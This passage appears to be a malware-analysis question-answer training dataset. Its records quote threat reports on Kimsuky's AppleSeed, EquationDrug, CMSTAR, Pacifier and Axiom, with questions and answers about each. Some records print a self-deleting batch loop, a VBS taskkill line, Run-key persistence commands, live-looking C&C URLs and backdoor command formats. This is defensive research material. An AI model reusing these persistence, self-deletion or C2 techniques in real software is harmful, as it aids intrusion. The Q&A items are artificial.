additionally created threads are completed. When the malware is terminated, the executed BAT file deletes itself and the BAT script.\n:goto_redel\nrd /s /q \"[executable file name]\"\ndel \"[executable file path]\"\nif exist \"[executable file path]\" goto goto_redel\ndel \"C:\\Users\\[user name]\\AppData\\Local\\Temp\\[random name].tmp.bat\"\n1.3. Additional Script\nThe PIF dropper malware mentioned earlier installs AppleSeed backdoor to trick users into thinking that they are opening an innocuous document file. Also, it also installs additional external payloads. To do so, it downloads a script through mshta.exe from the third thread and executes it. The downloaded VBS script can send basic information of the infected environment and download additional malware.\nSmall Headline: 1.3.2. Secondary Script\nTo collect the information of the infected system, the script first executes the following commands and saves the result as a file MSO2069.acl.\nThe file is encoded with certutil.exe that is a default Windows program and saved as a file with the name MSO2079.acl, which is then sent to the C&C server. The data sent takes a disguise of something similar to a certificate to bypass detection as shown in Figure 19.\nAfterward, the script registers the following two commands to the task scheduler.\nThe content of the .NetFramework.xml file that is created by the script is shown below. It accesses a particular URL and executes the script that is sent in response.\nThe script that was downloaded during the analysis is a code that forcibly terminates the mshta.exe process that is currently being executed as shown below.\nSet WShell=CreateObject(\"WScript.Shell\"):retu=WShell.run(\"cmd /c taskkill /im mshta.exe /f\" , 0 ,true)\nIn essence, one task downloads an additional script from external sources and executes it. The other task executes a file in a certain path using regsvr32. If the attacker responds with a script that installs additional malware files in the C:\\ProgramData\\Chrome\\update.cfg path instead of the auto-termination script, the additional malware will be executed by the second task scheduler.\n\nHow does the Kimsuky group typically distribute malware such as AppleSeed and PebbleDash, and what types of files do they often disguise their malware as?",
    "output": "The Kimsuky group primarily distributes malware such as AppleSeed and PebbleDash via spear phishing email attachments. These malware strains are often disguised as document files, such as pdf, docx, and hwp, which discuss current affairs like diplomacy, defense, and COVID-19. Additionally, the group may use other file types, such as jpg images or specific dat files, depending on the attack target. The initial distribution files are usually in an executable file or script format, with scripts being in wsf or js format and executables often distributed in PIF extensions.",

The DeviceIoControl part is not completely implemented and the driver is only able to check for some known control codes.  However it does nothing. This handler looks more like a code stub rather than actual payload.\nOn the Dynamic_Init event, the driver retrieves the location of the user-mode loader executable from the following registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] Con\u0141g\nIf the value is not present in the registry, it uses the following fallback string hardcoded in the binary:\nC:\\WINDOWS\\SYSTEM\\SVCHOST32.EXE\nNext, it installs a callback procedure using Windows function _SHELL_CallAtAppyTime. This procedure will be called when CPU is running in ring-3 mode, so that a new executable (loader process) can be started via the traditional way. This is a standard trick that was used by developers in the 90s to initiate a call to DLL export in ring-3 from ring-0 in Windows 9x OS family.\nBig Headline: Kernel mode stage 0 and rootkit (Windows 2000 and above) - msndsrv.sys\nFormat PE32 Native\nCompiled 2008.01.23 14:12:33 (GMT)\nLocation %System32%\\drivers\\msndsrv.sys\nThis module can create log \u0141les in the following known locations:\n%systemroot%\\system32\\mslog32.dat\n%systemroot%\\system32\\msperf32.dat (default location)\nThe driver acts as the \u0141rst stage of the EquationDrug platform on Windows 2000+ and implements rootkit functions for hiding the components of the platform. Additionally, it implements a NDIS driver for \u0141ltering network traf\u0141c.\nWhen started and initialized, the driver retrieves the location of the user-mode loader executable from the registry value:\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] Con\u0141g\nThe %driver name% is not hardcoded and is obtained dynamically from the current module name, which means that different instances may check different registry keys and this may not be a reliable way to check for infection. The sample we analyzed used \"msndsrv\" as the %driver name%.\nNext, it crafts and injects a shellcode in \"services.exe\" or \"winlogon.exe\". The shellcode is designed to spawn the loader process from the executable called \"mscfg32.exe\".\nThe rootkit code in the driver hooks several Native API functions that lets it hide or protect registry keys, \u0141les and running processes. The components of EquationDrug can modify the list of protected objects by sending DeviceIoControl messages to the driver. The driver also maintains a persistent list of protected objects that is stored in the following registry values:\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] 1\n[HKLM\\System\\CurrentControlSet\\Services\\%driver name%] 2\nThese values are also protected by the rootkit. They can be revealed by booting Windows in Safe Mode.\nThe driver contains the following unused strings:\n\\\\.\\mailslot\\dskInfo\nDissecorp\nBig Headline: User-mode loader - mscfg32.exe, svchost32.exe\nMD5 c3af66b9ce29efe5ee34e87b6e136e3a\nThis module opens a unique event named \"D0385CB7-B834-45d1-A501-1A1700E6C34E\". If the event exists, it waits for 10 seconds and attempts to open a \u0141le whose name can be decrypted as \"\\\\.\\MSNDSRV\". If the device \u0141le is successfully opened, the code issues a device request with IOCTL code 0x80000194 and no parameters.\nThis module uses RC5 in CBC-like mode with a key length of 96-bit for string encryption.\nCareful analysis reveals some bits of uninitialized memory found next to encryption key locations. This is unused but partly meaningful memory, because it seems to contain short chunks of strings resembling some local \u0141lepaths:\n\"rver\\8\" (probably part of \"Server\\8...\" string)\n\"LInj\" (could be a part of \"DLLInjector\" or similar)\nIt's apparent that some parts of the code were designed to run on Windows 9x, for example a call to RegisterServiceProcess Windows API function makes sense only on Windows 9x OS family, because this API function doesn't exist on Windows NT platform.\nThe module uses a unique algorithm for generating registry value names. The code contains strings, such as \"SkyhookChow Target\", that are converted to GUID-like strings by calculating SHA1 hash and using its hexadecimal representation as a string. The resulting strings are used as actual registry value names in [HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] registry key.\nSample registry value names:\nThese registry values are encrypted using an RC5 algorithm using a hardcoded 1024-bit key with 24 rounds.\nThe registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {F4CF0326-6DCDEEC8-5323-01CEDB66741A-B55F6F12} (\"SkyhookChow Payload\") should contain the location of the orchestrator DLL \u0141le (\"mscfg32.dll\"). If the value is not present a default value \"%SYSTEM%\\mscfg32.dll\" is used.\nThe registry value:\n[HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\MemSubSys] {B6F5CD13-A74D-8B82-\nA6AA-6FA1BE2484C1-6832DF06} (\"SkyhookChow Target\") may contain the location of the executable \u0141le that will be used as a \"shell\" process for the orchestrator library.\nThe module attempts to start the \"shell\" process in suspended mode. If there is no \"SkyhookChow Target\" value or the speci\u0141ed executable fails to start, the module tries different failsafe locations of the programs that can be used instead:\n1. Default browser set in the registry [HKLM\\SOFTWARE\\Clients\\StartMenuInternet\\{current @default value}\\shell\\open\\command]\n2. %SystemRoot%\\System32\\svchost.exe\n3. %SystemRoot%\\System32\\lsass.exe\n4.

Internet Explorer path from [HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\] IEXPLORE.EXE registry value.\nNext, the module injects extra code into a newly started target process. The injected code loads the payload DLL (\"mscfg32.dll\") into the target process and waits for the parent process to exit. When the parent process quits, it unloads the payload DLL and exits as well. The rest of the logic relies on the loaded DLL in that new process. See the description of the \"mscfg32.dll\" module below.\nThe module communicates with the Stage0/Rootkit driver \"msndsrv.sys\" by sending DeviceIoControl messages to the device \"\\\\.\\MSNDSRV\". It activates the rootkit for its own process, for the target process holding the orchestrator and for all the \u0141les involved.\n\nHow does the user-mode loader (mscfg32.exe, svchost32.exe) communicate with the Stage0/Rootkit driver (msndsrv.sys), and what specific actions does it take to ensure the payload DLL is loaded into a target process?",

    "instruction": "Big Headline: Phishing Emails\nBetween June and August of this year, we observed a total of 20 unique emails being sent to the following email addresses:\nThese emails contained a series of subject lines, primarily revolving around the topic of \u0417\u0430\u043f\u0430\u0434-2017 ( (<https://ru.wikipedia.org/wiki/%D0%97%D0%B0%D0%BF%D0%B0%D0%B4-2017>)'West-2017'), also known in English as (<https://en.wikipedia.org/wiki/Zapad_2017_exercise>)Zapad 2017. Zapad 2017 was a series of joint military exercises conducted by the Armed Forces of the Russian Federation and the Republic of Belarus, held from September 14th to 20th in 2017.\nThe full list of subject lines is as follows:\nFwd:\u041f\u043e\u0434\u0433\u043e\u0442\u043e\u0432\u043a\u0430 \u043a \u0417\u0430\u043f\u0430\u0434-2017 [Translation: Fwd:Preparing for the West-2017]\n\u0432\u044b\u043f\u0443\u0441\u043a \u0432\u043e\u0441\u043f\u0438\u0442\u0430\u043d\u043d\u0438\u043a\u043e\u0432 [Translation: graduation]\n\u041a \u0417\u0430\u043f\u0430\u0434-2017 [Translation: To West-2017]\n\u0417\u0430\u043f\u0430\u0434-2017 [Translation: West-2017]\nAn example of some of the previously mentioned emails may be seen below.\nBig Headline: Decoy Documents\nWe observed that the attachments used in these emails contained a mixture of file types. RTF documents, Microsoft Word documents, and a RAR archive. The RAR archive contained a series of images, a decoy document, and a Microsoft Windows executable within it. The executable has a .scr file extension, and is designed to look like a Windows folder, as seen below:\nThe rough translation of the folder and file names above are 'Preparations for large-scale West-2017 exercises in this format are being held for the first time.' Within the actual folder, there are a series of JPG images, as well as a decoy document with a title that is translated to 'Thousands of Russian and Belarusian military are involved in the training of the rear services.'\nThe decoy document contains the following content:\nThe other RTF and Word documents used additional decoy documents, which can be seen below.\nWhile we observed different techniques being used for delivery, all attachments executed a variant of the CMSTAR malware family. We observed minor changes between variants, which we discuss in the CMSTAR Variations and Payloads section of the blog post.\nThe Word documents, which we track as Werow, employ malicious macros for their delivery. More information about these macros may be found in the Appendix of the blog post. Additionally, we have included a script that extracts these embedded payloads that can also be found in the Appendix.\nThe RTF documents made use of (<https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1641>)CVE-2015-1641. This vulnerability, patched in 2015, allows attackers to execute malicious code when these specially crafted documents are opened within vulnerable instances of Microsoft Word. The payload for these samples is embedded within them and obfuscated using a 4-byte XOR key of 0xCAFEBABE. We have included a script that can be used to extract the underlying payload of these RTFs statically that can be found in the Appendix.\nThe SCR file mentioned previously drops a CMSTAR DLL and runs it via an external call to rundll32.exe.\nBig Headline: CMSTAR Variations and Payloads\nIn total, we observed three variations of CMSTAR in these recent attacks against Belarusian targets. The biggest change observed between them looks to be minor modifications made to the string obfuscation routine. A very simple modification to the digit used in subtraction was modified between the variants, as shown below:\nThe older variation, named CMSTAR.A, was discussed in a previous blog post entitled, \"(<https://researchcenter.paloaltonetworks.com/2016/03/digital-quartermaster-scenario-demonstrated-in-attacks-against-the-mongolian-government/>)Digital Quartermaster Scenario Demonstrated in Attacks Against the Mongolian Government .\"\nThe CMSTAR.B variant was witnessed using both a different mutex from CMSTAR.A, as well as a slightly modified string obfuscation routine. The mutexes used by CMSTAR ensure that only one instance of the malware runs at a time. The CMSTAR.C variant used the same mutex as CMSTAR.B, however, again used another slightly modified string obfuscation routine. We found all CMSTAR variants using the same obfuscation routine when I payload was downloaded from a remote server. We have included a tool to extract mutex and C2 information from all three CMSTAR variants, as well as a tool to decode the downloaded payload: both may be found in the Scripts section.\nAn example of CMSTAR downloading its payload may be found below:\nWhen expanding the research to identify additional CMSTAR.B and CMSTAR.C variants, we identified a total of 31 samples. Of these 31 samples, we found two unique payloads served from three of the C2 URLS\u2014One of which was downloaded from a sample found in the phishing attacks previously described. Both payloads contained previously unknown malware families. We have named the payload found in the email campaign PYLOT, and the malware downloaded from the additional CMSTAR samples BYEBY.\nBoth malware families acted as backdoors, allowing the attackers to execute commands on the victim machine, as well as a series of other functions. More information about these individual malware families may be found in the appendix.\nBig Headline: Conclusion\nDuring the course of this research, we identified a phishing campaign consisting of 20 unique emails targeting the government of Belarus. The ploys used in these email and decoy documents revolved around a joint strategic military exercise of the Armed Forces of the Russian Federation and the Republic of Belarus, which took place between September 14th and September 20th of this year. While looking at the emails in question, we observed two new variants of the CMSTAR malware family. Between the samples identified and others we found while expanding our research scope, we identified two previously unknown malware families.\nPalo Alto customers are protected from this threat in the following ways:\nTags have been created in AutoFocus to track (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.Cmstar>)CMSTAR, (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.BYEBY>)BYEBY, and (<https://autofocus.paloaltonetworks.com/#/tag/Unit42.PYLOT>)PYLOT\nAll observed samples are identified as malicious in WildFire\nDomains observed to act as C2s have been flagged as malicious\nTraps 4.1 identifies and blocks the CVE-2015-1641 exploit used in these documents\nTraps 4.1 blocks the macros used in the malicious Word documents\nA special thanks to Tom Lancaster for his assistance on this research.\nMedium Headline: Werow Macro Analysis\nThe attacker used the same macro dropper all of the observed Microsoft Word documents we analyzed for this campaign. It begins by building the following path strings:\n%APPDATA%\\d.doc\n%APPDATA%\\Microsoft\\Office\\WinCred.acl\nThe 'd.doc' path will be used to store a copy of the Word document, while the 'WinCred.acl' will contain the dropped payload, which is expected to be a DLL.\nWerow uses rudimentary obfuscation to hide and re-assemble the following strings:\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinCred\nrundll32 %APPDATA%\\Microsof\\Office\\WinCred.acl ,WinCred\nThese strings will be used at the end of the macro's execution to ensure persistence via the Run registry key.\nThe malware proceeds to read an included overlay within the original Word document from a given offset. This data is decoded using and XOR operation, as well as an addition operation. It can be represented in Python as follows:\nOnce this overlay is decoded, it is written to the 'WinCred.acl' file and loaded with the 'WinCred' export. A script has been provided in the Scripts section that, in conjunction with oletools, can statically extract the embedded DLL payload from these documents.\nMedium Headline: RTF Shellcode Analysis\nThe RTF documents delivered in this attack campaign appear to be created by the same builder. All of the RTF files attempt to exploit CVE-2015-1641 to execute shellcode on the targeted system. Please reference https://technet.microsoft.com/en-us/library/security/ms15-033.aspx for more information.\nThe shellcode executed after successful exploitation begins by resolving the API functions it requires by enumerating the API functions within loaded modules in the current process. It then builds the following list of values:\nThe shellcode then enumerates the API functions, subjects them to a ROR7 hashing routine and XORs the resulting hash with 0x10ADBEEF. It uses the result of this arithmetic to compare with the list of values above to find the API functions it requires to carry out its functionality.\nSmall Headline: ROR7 ROR7^0x10ADBEEF API Func\nAfter resolving the API functions, the shellcode then begins searching for the embedded payload and decoy within the initial RTF file. It does so by searching the RTF file for three delimiters, specifically 0xBABABABABABA, 0xBBBBBBBB and 0xBCBCBCBC, which the shellcode uses to find the encrypted payload and decoy. The shellcode then decrypts the payload by XOR'ing four bytes at at time with the key 0xCAFEBABE, and decrypts the decoy by XOR'ing four bytes at a time using the key 0xBAADF00D. Here is a visual representation of the delimiters and embedded files:\nAfter decrypting the payload, it saves the file to the following location:\n%APPDATA%\\Microsoft\\Office\\OutL12.pip\nThe shellcode then creates the following registry key to automatically run the payload each time the system starts:\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run : Microsoft\nThe shellcode saves the following command to this autorun key, which will execute the OutL12.pip payload, specifically calling its 'WinCred' exported function:\nrundll32.exe\n\"%APPDATA\\Roaming\\Microsoft\\Office\\OutL12.pip\",WinCred\nThe shellcode will then overwrite the original delivery document with the decrypted decoy contents and open the new document.\nQ: How did the Werow macro used in the Microsoft Word documents achieve persistence on the infected systems?",
    "output": "The Werow macro used in the Microsoft Word documents achieved persistence by creating specific paths and registry keys. It built path strings for '%APPDATA%\\d.doc' and '%APPDATA%\\Microsoft\\Office\\WinCred.acl', where 'd.doc' stored a copy of the Word document and 'WinCred.acl' contained the dropped payload, typically a DLL. The macro then used rudimentary obfuscation to hide and re-assemble strings for the registry key 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinCred' and the command 'rundll32 %APPDATA%\\Microsof\\Office\\WinCred.acl ,WinCred'. These steps ensured that the malware would run every time the system started.",

    "instruction": "Context: Medium Headline: The Dropper\nThe dropper looks the same as the other droppers, only smaller in size. The files that it contains are encrypted with RC4 in overlay. Only two files will be dropped:\n%appdata%\\Aggea\\ivotp.xpi\n%appdata%\\Aggea\\ylir.js\nThe names Aggea, ivotp.xpi, ylir.js are random generated. No clean document is present in the dropper and the initial infected document will not close. There is no second dropper either. The javascript file is executed, installs the xpi file as an extension in Firefox and then deletes the directory %appdata%\\Aggea\\.\nSmall Headline: 2.js\nThe file 2.js contains the C&C addresses and the network functionality. All data to and from the C&C will be sent through normal HTTP but it will be encrypted and converted to base64. The encryption key is generated once when the extension is started but it can be changed if the C&C requests as we will see later. In this variant we find 6 C&C addresses (presumably these are previously-compromised machines):\nhttp://reckless.dk/wp-includes/class-pomo.php http://reckless.dk/wp-includes/class.wp-db.php http://fishstalk.esy.es/wp-content/plugins/bbpress/includes/common/menu.php http://fishstalk.esy.es/wp-includes/SimplePie/Net/IPv4.php http://77-ufo.com/wp-includes/class-menu.php http://77-ufo.com/pma/db_table.php\nThe strings in the files are not visible because the javascript files are highly obfuscated. The function that sends the data to the C&C also receives the response. The function will select each time a C&C that responds from the list. This file would be the equivalent of the msvct. dll file from the earlier version.\nmain.js\nThe file main.js is the actual backdoor (msvck.dll equivalent). The malware starts by creating an ID for the system. The ID is a Md5 hash on some data colected from the system. The ID is sent in every request to the C&C as in the previous version with executable files. This is an example of the data collected for the ID from a test machine:\n{285364ef-e70c-4386-8e5c-2aa93a78daad}C:\\Documents  and\nSettings\\user\\Application Data\\Mozilla\\Firefox\\Profiles\\2gmaw237. defaultC:\\Documents and Settings\\user\\Desktop{ec8030f7c20a-464f-9b0e-13a3a9e97384}\nThere are no line separators, it is just a long string. The ID in this case will be \"5815da5d0d5565f342474d976f507807\". The gathered data represents:\n{285364ef-e70c-4386-8e5c-2aa93a78daad} \u2013 GUID for the extension\nC:\\Documents and Settings\\user\\Application Data\\Mozilla\\Firefox\\Profiles\\2gmaw237.default\nFirefox profile folder where the extension was placed\nC:\\Documents and Settings\\user\\Desktop \u2013 desktop folder of the active user\n{ec8030f7-c20a-464f-9b0e-13a3a9e97384} - GUID for Firefox\nAfter the ID was generated, an encryption/decryption key will be created. It concatenates the hardcoded string \"7201895b632dc5044c02ea98b0dbd371\" with the string containing the ID. In the case of our example this will make the string \"7201895b632dc5044c02ea98b0dbd3715815da5d0d5565f342474d976f507807\". Then it makes the Md5 hash on the string which will result in \"ec398e010a0cb6b6e4f48722dc07eaa3\".\nThis final buffer (containing a C like string with the md5) is the decryption key. The key is subsequently used for encryption and decryption of every message sent and received from the C&C.\nNext it gathers more data about the system. Again, an example from the test machine:\n5815da5d0d5565f342474d976f507807 {285364ef-e70c-4386-8e5c-2aa93a78daad} winnt x86\nMozilla Firefox {ec8030f7-c20a-464f-9b0e-13a3a9e97384} 35.0\nC:\\Documents and Settings\\user\\Application Data\\Mozilla\\Firefox\\Profiles\\2gmaw237.default\nC:\\Documents and Settings\\user\\Desktop\n0040|||C:\\Documents and Settings\\user\\Application Data\\Mozilla\\Firefox\\Profiles\\2gmaw237.default\\user.js\nLines are separated by line feed (0x0A).

If is still present after deletion it will put 0041 instead 0040 as the status.\nThe data is encrypted with the key that was generated and sent to the C&C. Finally the malware sets a timer which calls a function that sends to C&C, receives from C&C and processes the backdoor commands every five seconds. The commands are made up from 3 strings separated by \"|||\",like \"nr|||string1|||string2\".\nnr will be '0' to '6' and represents the backdoor command. string1 and string2 contain file names, urls and other things used by the commands. In some commands string2 is not used. The commands are:\n\"1|||file commandlineOptions\"\nExecutes the file \"file\" with command line parameters \"commandlineOptions\". stdout and stderr are redirected to a string and the content of the string will be sent to the C&C. If the file to be executed does not exists it sends back to the C&C \"0011|||file\"\n\"2|||url|||file\"\nDownloads the file from \"url\" and writes it with the name \"file\". Returns to the C&C \"0020|||file\" if the file was successfuly written, \"0021|||file\" if the file was not written or \"0051|||url|||errCode\" if the download failed.\n\"3|||file\"\nSearches the file \"file\" and sends it to the C&C. In case of an error it will return \"0034|||file\" if the file is a folder, \"0033|||file|||size\" if the file size is greater than 5000000 bytes, \"0031|||file\" if the file exists but it couldn't get information about it, \"0032|||file\" if the file does not exists, \"0051|||url|||errCode\" if the file could not be sent due to some network problems.\n\"4|||file\"\nDeletes the file \"file\". Returns to the C&C \"0040|||file\" if the file was deleted or \"0041|||file\" if the file could not be deleted.\n\"5|||string1|||file\"\nSends back \"string1\" to the C&C. The C&C responds with a buffer which will be written to the file \"file\". It sends back to the C&C \"0020|||file\" if the file was successfuly written, \"0021|||file\" if the file could not be written or \"0051|||url|||errCode\" in case of network problems.\n\"6|||path|||depth\"\nLists files and directories from \"path\" recursively until \"depth\" level, then it sends the list to the C&C. An example:\n0060|||c:\\0\n1|c:\\0\\Documents|d|ct=NaN|lat=1442919637000|lmt=1442919637000|\n1|c:\\0\\main.js|17394|ct=NaN|lat=1442919639000|lmt=1442405697000|\n1|c:\\0\\main1.js.js_format|9486|ct=NaN|lat=1442919639000|lmt=1442404160000|\n2|c:\\0\\Documents\\rec.doc|12|ct=NaN|lat=1442919637000|lmt=1442919637000|\n...\n0061|||path_failed|||error_code\n...\n0061|||c:\\0|||10000\nThe \"path\" listed and a return code would be \"0060|||c:\\0\". \"1\" and \"2\" from the start of the lines is the level of a file or directory. The count starts at 1 and the maximum level would be \"depth\"+1This is followed by a file or directory path. After the path a \"d\" follows, if the path specifies a directory, or something like \"17394\" in case of a file, which is the size of the file. \"ct=NaN\" is the creation time of a file. There is a typo in the code and because of that the creation time is never actually retrieved (\"winBirtdhDate\" instead of \"winBirthDate\"). \"lat=1442919637000\" is the last access time. \"lmt=1442919637000\" is last modified time. \"0061|||path_failed|||error_code\" is optional and may appear multiple times, contains a path at which the file enumeration failed. \"00061|||c:\\0|||10000\" at the end is optional and appears only if the listing so far contains more than 10000 characters, then no more lines will be added.\n\"0|||key\"\nSets a new encryption/decryption key with the C string \"key\"\n\nQuestion: Explain the process by which the Pacifier APT generates a unique system ID and encryption/decryption key. How is this ID used in communication with the C&C server?\n\nAnswer:",
    "output": "The Pacifier APT generates a unique system ID by creating an MD5 hash on some data collected from the system. This data includes the GUID for the extension, the Firefox profile folder where the extension was placed, the desktop folder of the active user, and the GUID for Firefox. For example, the data might look like '{285364ef-e70c-4386-8e5c-2aa93a78daad}C:\\\\Documents and Settings\\\\user\\\\Application Data\\\\Mozilla\\\\Firefox\\\\Profiles\\\\2gmaw237.defaultC:\\\\Documents and Settings\\\\user\\\\Desktop{ec8030f7-c20a-464f-9b0e-13a3a9e97384}', resulting in an ID like '5815da5d0d5565f342474d976f507807'. The encryption/decryption key is then created by concatenating a hardcoded string '7201895b632dc5044c02ea98b0dbd371' with the ID string and making an MD5 hash of the result. This key is used for encryption and decryption of every message sent and received from the C&C server. The system ID is included in every request to the C&C server.",

    "instruction": "Big Headline: Key Findings\nAxiom is responsible for directing highly sophisticated cyber espionage operations against numerous Fortune 500 companies, journalists, environmental groups, pro-democracy groups, software companies, academic institutions, and government agencies worldwide for at least the last six years. In our coordinated effort, we performed the first ever-private sponsored interdiction against a sophisticated state sponsored advanced threat group. Our efforts detected and cleaned 43,000 separate installations of Axiom tools, including 180 of their top tier implants. This report will expand upon the following key findings:\n\u25cf A coordinated effort across the private sector can have quantifiable impact on state-sponsored threat actors.\n\u25cf The Axiom threat group is a well resourced, disciplined, and sophisticated subgroup of a larger cyber espionage group that has been directing operations unfettered for over six years.\n\u25cf Novetta has moderate to high confidence that the organization-tasking Axiom is a part of Chinese Intelligence Apparatus. This belief has been partially confirmed by a recent FBI flash released to Infragard stating the actors are affiliated with the Chinese government1 .\n\u25cf Axiom actors have victimized pro-democracy non-governmental organizations (NGO) and other groups and individuals that would be perceived as a potential threat to the stability of the Chinese state.\n\u25cf Axiom operators have been observed operating in organizations that are of strategic economic interest, that influence environmental and energy policy, and that develop cutting edge information technology including integrated circuits, telecommunications equipment manufacturers, and infrastructure providers.\n\u25cf Later stages of Axiom operations leverage command and control infrastructure that has been compromised solely for the targeting of individual or small clusters of related targeted organizations.\n\u25cf Axiom uses a varied toolset ranging from generic malware to very tailored, custom malware designed for long-term persistence that at times can be measured in years. In descending order of observed scarcity these families are:\n\u25cb Zox family (ZoxPNG, ZoxRPC)/Gresim\n\u25cb Hikit\n\u25cb Derusbi\n\u25cb Fexel/Deputy Dog\n\u25cb Hydraq/9002/Naid/Roarur/Mdmbot\n\u25cb ZXShell/Sensode\n\u25cb PlugX/Sogu/Kaba/Korplug/DestroyRAT\n\u25cb Gh0st/Moudour/Mydoor\n\u25cb Poison Ivy/Darkmoon/Breut\n1 http://www.slideshare.net/ragebeast/infragard-hikitflash\nMedium Headline: Operational Impact\nOn Tuesday, October 14, 2014, Operation-SMN took its first public action as a Coordinated Malware Eradication campaign (CME-2014-03). This first action consisted of efforts intended to impede the ability of this and other threat actors to leverage this suite of tools. To do so, the coalition:\n\u25cf Released detection and removal signatures for related malware both publicly and through our coalition partners into their customer bases.\n\u25cf Provided detection guidance to trusted security partners, including those in the Microsoft Virus Information Alliance program, so that as many potentially affected victims as possible will have detection and protection against this threat.\n\u25cf Released several stages of reporting designed to raise awareness and highlight the tools, techniques, and procedures leveraged by Axiom and some affiliated groups.\nThe breadth and scope of Axiom's operations served as motivation and justification for the approach adopted by the coalition of large scale data capture, analysis, and distribution of both data and analytical output to industry. In the intervening period, the coalition has received a substantial amount of information relating to the removal of these malware tools. To date, over 43,000 separate installations of Axiom-related tools have been removed from machines protected by Operation SMN partners, and 180 of those infections were examples of Hikit, the late-stage persistence and data exfiltration tool that represents the height of an Axiom victim's operational lifecycle.\nShown below are two graphs, generated with data from Microsoft's MSRT telemetry, which graph the installation footprint of the various malware samples that Axiom has been observed using. Three clear clusters emerge, centered on what Novetta believes to be areas of responsibility for Axiom. These graphs speak to the usage of a multi-stage corpus of malware which allows the operators to continually refine their targeting as they get closer and closer to their intended goals.\n\nQ: What are the key characteristics of the Axiom threat group's operations and how do they reflect the sophistication and resources of the group?",
    "output": "A: The Axiom threat group is characterized by its well-resourced, disciplined, and sophisticated operations, which have been ongoing for over six years. They have targeted a wide range of entities, including Fortune 500 companies, journalists, environmental groups, pro-democracy groups, software companies, academic institutions, and government agencies worldwide. Axiom's operations are notable for their strategic focus on organizations of economic interest, those influencing environmental and energy policy, and developers of cutting-edge information technology. The group employs a varied toolset, ranging from generic malware to highly tailored, custom malware designed for long-term persistence, indicating their advanced capabilities and significant resources. Additionally, later stages of their operations involve leveraging compromised command and control infrastructure specifically for targeted organizations, further demonstrating their sophistication and precision.",

    "instruction": "Big Headline: 2. Analysis of Downloader Malware\nAs mentioned earlier, there is a downloader malware among those installed by the PIF dropper. This malware operates after being registered to the task scheduler and essentially performs the role of a downloader: periodically accessing the C&C server to download and execute additional payloads.\nCurrently, multiple downloader malware types can be checked in AhnLab's ASD infrastructure. They likely\ncreated malware strains used by the Kimsuky group. Note that according to a report made by S2W LAB, there has been cases of the downloader malware downloading and installing the Meterpreter backdoor in infected environments. 1\nSmall Headline: 2.1.1. Install Process\nAs for the analysis sample, when the downloader malware is executed, it first creates the Intel folder in the %ALLUSERSPROFILE% (ProgramData) folder and copies itself with the name \"Driverdriver.cfg.\" Most samples choose ProgramData as the installation folder, but some select %APPDATA% (\\AppData\\Roaming) instead. There are also cases of the file name being driver.cfg instead of Driverdriver.cfg.\nWhen the copying process is over, the malware executes the file in the copied path using regsvr32.exe. The actual malicious behaviors are performed in the downloader process that is executed following the steps shown above. When the install process is over, the file that is initially executed is auto-deleted. It is a method that uses a batch file and is frequently employed by malware strains that were recently used by the Kimsuky group.\nIt then checks for concurrent execution using a mutex. The sample for the current analysis uses the following name for the mutex:\n- Mutex: windows update server real time mui cache\"\nThe malware uses a unique 8-byte sized random binary data to check whether the system is infected or not. It first scans for the following registry key. If the key does not exist, it creates a random 0x08 byte binary value and uses this value for the registry shown below. The value is used to communicate with the C&C server.\n- Added Registry Key: HKCU\\Software\\Microsoft\\FTP / Use Smtp\n1\nThe malware registers the following command to the task scheduler so that it executes every 30 minutes.\nSmall Headline: 2.1.2. Downloader Behavior\nThe malware uses the HTTP protocol and the following three types of queries to communicate with the C&C server. u is the unique identifier that was discussed earlier, and i means a command. p appears to be a secondary parameter, but as the malware has a simple structure, it would not have much significance.\n- Format: http://[C&C URL]/init/image?i=[command]&u=[unique identifier]&p=[secondary parameter]\nThe following URL is used when the malware initially connects with the C&C server. The \"6352db963f367e75\" part is the 8-byte binary data that was randomly generated and saved in the registry key converted into a string.\n- Example: http://[C&C URL]/init/image?i=init&u=6352db963f367e75&p=ya\nThe User-Agent string used to communicate with the C&C server is as follows:\n- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130\nThe malware then sends a PING query. Up until this part of the process, the data received from the C&C server is not used. It seems that this part is a reset process for the sample to send infection status to the C&C server and download additional files.\n- Example: http://[C&C URL]/init/image?i=ping&u=6352db963f367e75&p=wait..\nNow the actual downloading begins. The download URL is \"[random 8-byte string].down\" as shown below.\n- Format: http://[C&C URL]/init/[Unique Identifier].down\n- Download URL Example: http://[C&C URL]/init/6352db963f367e75.down\nThe downloader downloads files using the URLDownloadToFileW() API without going through any complicated processes. The download path is shown below. The name of the file also has a random value in the \"cachew[random name].cache\" format.\n- Download Path Example: C:\\ProgramData\\Intel\\Driver\\cachew-671417171.cache\nAs the downloaded file is encoded with 4-byte Xor, it needs to be additionally decoded.\n- Xor Key: 96 50 28 44\nThe decoded malware is executed. As the downloader uses regsvr32.exe upon executing it, the additional payloads likely only exist as DLLs. After the process is over, the result is sent to the C&C server using the example URL shown below.\n- Example: http://[C&C URL]/init/image?i=down&u=6352db963f367e75&p=ya\n3. Analysis of AppleSeed\nAmong types of malware installed through the script malware or PIF dropper, there is a backdoor called AppleSeed. It performs commands it received from the attacker via the C&C server and sends the result back. It also includes features, such as a downloader that installs additional malware strains, performs keylogging and screenshots, and steals information by collecting files from the user system.\nThe malware is mainly divided into two types depending on the C&C communications method. Most of them use the HTTP protocol, but some strains communicate with C&C through emails. There are also other differences in features. Not every type of AppleSeed is equipped with the info-stealing feature. Some types may only contain basic features of receiving and executing additional malware or commands from the C&C server. Among all samples, this report will discuss those that use HTTP or emails to communicate with C&C and those that include info-stealing features.\nSome samples appear to contain binaries built using debug mode by the attacker. As such, one can check the debug messages designated by the developer for each function as shown in Figure 23.\nThe target chosen for the analysis is a sample built in debug mode, the one that can be 